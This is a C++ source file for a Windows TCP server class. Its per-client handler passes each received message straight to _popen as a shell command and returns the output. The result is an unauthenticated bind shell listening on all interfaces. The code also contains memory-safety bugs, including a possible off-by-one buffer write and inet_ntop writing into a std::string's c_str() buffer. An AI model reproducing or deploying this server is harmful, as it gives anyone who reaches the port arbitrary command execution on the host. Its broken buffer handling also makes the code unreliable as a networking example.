#include "stdafx.h"
#include "TCPServer.h"
#include <io.h>
#include <Ws2tcpip.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <stdexcept>
#include <string>
#include <array>



std::string TCPServer::Message;

void* TCPServer::Task(void *arg)
{
	int newsockfd = (long)arg;
	char msg[MAXPACKETSIZE];
	ZeroMemory(msg, 4096);
	Message = "";

	while (1)
	{
		int n = recv(newsockfd, msg, MAXPACKETSIZE, 0);
		if (n == SOCKET_ERROR)
		{
			wprintf(L"recv() failed with error: %ld\n", WSAGetLastError());
			break;
		}
		if (n == 0)
		{
			std::cout << "Client disconnected" << std::endl;
			break;
		}
		msg[n] = 0;
		std::string messege = msg;
		Message = std::string(msg);
		auto handleMessage = [](std::string msg)
		{
			msg.append(" 2>&1");
			const char* cmd = msg.c_str();
			std::array<char, 128> buffer;
			std::string result;
			std::shared_ptr<FILE> pipe(_popen(cmd, "r"), _pclose);
			if (!pipe) throw std::runtime_error("_popen() failed!");
			//fputs(cmd, pipe.get());
			while (!feof(pipe.get())) {
				if (fgets(buffer.data(), 128, pipe.get()) != nullptr)
					result += buffer.data();
			}
			return result;
		};
		messege = handleMessage(messege);
		std::cout << messege << std::endl;
		if (messege == "") messege = ": ";
		send(newsockfd, messege.c_str(), messege.length(), 0);



	}

	return 0;
}

void TCPServer::setup(int port)
{
	//WSA setup
	WSADATA wsData{};
	if (WSAStartup(MAKEWORD(2, 2), &wsData) == 0)

		//Creating and binding server socket for listening
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd == INVALID_SOCKET)
	{
		std::cerr << "server socket err" << std::endl;
	}

	ZeroMemory(&serverAddress, sizeof(serverAddress));
	serverAddress.sin_family = AF_INET;
	serverAddress.sin_addr.s_addr = htonl(INADDR_ANY);
	serverAddress.sin_port = htons(port);
	if (bind(sockfd, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
		wprintf(L"bind failed with error: %ld\n", WSAGetLastError());
		closesocket(sockfd);
		WSACleanup();
	}

	if (listen(sockfd, SOMAXCONN) == SOCKET_ERROR) {
		wprintf(L"listen failed with error: %ld\n", WSAGetLastError());
		closesocket(sockfd);
		WSACleanup();
	}


	std::cout << "TCP server setup success\n" << std::endl;
}

std::string TCPServer::receive()
{
	std::string str;
	while (1)
	{
		int sosize = sizeof(clientAddress);
		newsockfd = accept(sockfd, (struct sockaddr*)&clientAddress, &sosize);
		if (newsockfd == INVALID_SOCKET)
		{
			std::cerr << "client socket err" << std::endl;
		}
		else std::cout << "new client: " << newsockfd << std::endl;
		inet_ntop(clientAddress.sin_family, (const void*)&clientAddress.sin_addr, (char*)str.c_str(), INET_ADDRSTRLEN);
		std::thread serverThread(Task, (void*)newsockfd);
		serverThread.detach();
	}
	return str;
}

std::string TCPServer::getMessage()
{
	return Message;
}



void TCPServer::Send(std::string msg)
{

	send(newsockfd, msg.c_str(), msg.length(), 0);
}

void TCPServer::clean()
{
	Message = "";
	ZeroMemory(msg, MAXPACKETSIZE);
}

void TCPServer::closeserver()
{
	closesocket(sockfd);
	closesocket(newsockfd);
	WSACleanup();
}